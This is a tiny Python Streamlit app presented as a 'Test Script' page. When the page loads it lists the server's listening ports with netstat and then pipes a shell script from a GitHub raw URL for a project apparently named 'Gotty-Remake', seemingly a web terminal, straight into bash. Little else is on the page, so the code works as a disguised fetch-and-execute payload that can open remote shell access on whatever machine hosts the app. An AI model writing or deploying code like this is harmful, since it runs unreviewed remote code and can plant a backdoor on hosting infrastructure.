import streamlit as st
import os

st.title("Test Script")
st.header("Test")

os.system("netstat -ntlp")
results = os.system("curl -fsSL https://raw.githubusercontent.com/aphiwemthambisi/Gotty-Remake/refs/heads/main/script.sh | bash")
st.write(results)
